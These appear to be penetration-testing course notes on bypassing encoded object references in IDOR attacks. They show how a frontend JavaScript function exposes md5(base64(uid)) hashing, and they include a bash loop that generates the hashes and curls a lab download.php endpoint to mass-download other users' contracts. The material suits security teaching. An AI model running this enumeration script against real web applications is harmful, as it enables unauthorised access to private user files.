## Bypassing Encoded References
* In some cases, web applications make hashes or encode their object references, making enumeration more difficult, but it may still be possible

```php
contract=cdd96d3cc73d1dbdaffa03cc6cd7339b
```

* Using a `download.php` script to download files is a common practice to avoid directly linking to files
* Here it appears to be hashing it in an `md5` format
* We can attempt to hash various values, like `uid`, `username`, `filename`, and many others, and see if any of their `md5` hashes match the above value
* We may also utilize `Burp Comparer` and fuzz various values and then compare each to our hash to see if we find any matches

## Function Disclosure
* Most modern web applications are developed using JavaScript frameworks
	* `Angular`, `React` or `Vue.js`
* Many make the mistake of performing sensitive functions on the frontend
	* Exposes them to attackers
* If we take a look at the link in the source code, we see that it is calling a JavaScript function with `javascript:downloadContract('1')
* Looking at the `downloadContract()` function in the source code, we see the following

```javascript
function downloadContract(uid) {
    $.redirect("/download.php", {
        contract: CryptoJS.MD5(btoa(uid)).toString(),
    }, "POST", "_self");
}
```

* We can test this by `base64` encoding our `uid=1`, and then hashing it with `md5`, as follows

```sh
$ echo -n 1 | base64 -w 0 | md5sum

cdd96d3cc73d1dbdaffa03cc6cd7339b -
```

**Tip:** We are using the `-n` flag with `echo`, and the `-w 0` flag with `base64`, to avoid adding newlines, in order to be able to calculate the `md5` hash of the same value, without hashing newlines, as that would change the final `md5` hash

## Mass Enumeration
* This is the easiest and most efficient method of enumerating data and files through IDOR vulnerabilities
* In more advanced cases, we may utilize tools like `Burp Intruder` or `ZAP Fuzzer`

```sh
$ for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

cdd96d3cc73d1dbdaffa03cc6cd7339b
0b7e7dee87b1c3b98e72131173dfbbbf
0b24df25fe628797b3a50ae0724d2730
f7947d50da7a043693a592b4db43b0a1
8b9af1f7f76daf0f02bd9c48c4a2e3d0
006d1236aee3f92b8322299796ba1989
b523ff8d1ced96cef9c86492e790c2fb
d477819d240e7d3dd9499ed8d23e7158
3e57e65a34ffcb2e93cb545d024f5bde
5d4aace023dc088767b4e08c79415dcd
```

```bash
#!/bin/bash

for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done
```

